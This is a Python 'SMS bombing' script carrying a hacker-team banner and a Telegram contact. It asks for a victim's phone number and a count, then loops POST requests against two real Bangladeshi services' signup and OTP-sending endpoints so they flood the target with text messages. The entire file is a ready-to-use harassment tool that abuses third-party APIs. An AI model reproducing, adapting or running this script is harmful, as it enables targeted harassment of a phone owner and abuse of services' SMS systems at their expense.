#Importing Our Request Module
import requests
import os
 
#Get Target Number Of Victim
logo ="""

/33[0;31m ███╗   ██╗ █████╗ ██╗  ██╗██╗██████╗     
/33[0;32m ████╗  ██║██╔══██╗██║  ██║██║██╔══██╗    
/33[0;33m ██╔██╗ ██║███████║███████║██║██║  ██║    
/33[0;34m ██║╚██╗██║██╔══██║██╔══██║██║██║  ██║    
/33[0;35m ██║ ╚████║██║  ██║██║  ██║██║██████╔╝    
/33[0;37m ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝     
                                                                                     
\033[0;35mOWNER       ☞  𒆜  𝑯𝒂𝒄𝒌𝒊𝒏𝒈 𝒃𝒐𝒚 𒆜
\033[1;31m FACEBOOK  ☞  Md Nahid Hasan 
\033[1;35mTELEGRAM ☞ t.me/BDKING84
\033[1;33m________________________________________________________________        
\033[1;31m                      𝐓𝐄𝐀𝐌 𝐇𝐀𝐂𝐊𝐄𝐑 𝟗𝟗𝟗
"""

#Get Target Number Of Victim
os.system('clear')
print(logo)
number  = input("Enter Your Target Number: ")
 
#Get The Amount of SMS To Send
amount = int(input("Enter Your Amount: "))
 
 
#Our First API Function
def api1():
    #API URL
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
    
    #API Data
    data = {
      "requestType": "send",
      "phoneNumber": "+88" + number,
      "emailConsent": "true",
      "whatsappConsent": "true"
    }
    
    #Request Header
    headers = {
        "Content-Type" : "application/json"
    }
    
    #Request Our API
    response = requests.post(url, json = data, headers = headers).status_code
    
    #Return Our Response Staus Code
    return response
 
#Our Second API Function
def api2():
    #API URL
    url = "https://api.bongo-solutions.com/auth/api/login/send-otp"
    
    #API Data
    data = {
        "operator" : "all",
        "msisdn": "88" + number
    }
    
    #Request Header
    headers = {
        "Content-Type" : "application/json"
    }
    
    #Request Our API
    response = requests.post(url, json = data, headers = headers).status_code
    
    #Return Our Response Status Code
    return response
 
 
print("\nBombing Started!\n")
 
#Our SMS Sent Amount Variable
done = 0
 
#Loop To Execute Our Bombing
while True:
    #Calling Our First API
    code = api1()
    
    #If Our Request Is Successfull, Than Do This
    if (code == 200):
        done += 1
        print(str(done) + " Sms Sent Successfully!!")
    #If Not Successfull, Than Do This
  #  else:
        #print("Sms Send Failed!")
    
     #If Our Sent Sms Amounts and Our Desired Amounts  are same, Than Break The Loop
    if (done == amount):
        print("\nBombing Finished!")
        break
     
    #Calling Our Second API
    code = api2()
    
    #If Our Request Is Successfull, Than Do This
    if (code == 200):
        done += 1
        print(str(done) + " Sms Sent Successfully!!")
    #If Not Successfull, Than Do This
    #else:
        #print("Sms Send Failed!")
    
    #If Our Sent Sms Amounts and Our Desired Amounts  are same, Than Break The Loop
    if (done == amount):
        print("\nBombing Finished!")
        break